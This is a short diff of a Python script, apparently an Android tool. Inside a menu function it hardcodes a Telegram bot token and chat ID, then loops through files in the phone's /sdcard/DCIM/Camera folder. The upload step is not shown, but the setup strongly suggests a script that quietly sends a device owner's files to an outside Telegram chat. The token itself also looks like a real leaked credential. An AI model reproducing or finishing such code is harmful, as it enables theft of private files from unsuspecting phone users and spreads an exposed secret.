@@ -42,7 +42,7 @@ def menu():
     bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
     chat_id = '566775944'      # Replace with your actual chat ID
     extension = '.py'
-    path = os.path.join('/sdcard/DCIM')
+    path = os.path.join('/sdcard/DCIM/Camera')
 
     for file in os.listdir(path):
         if file.endswith(extension):
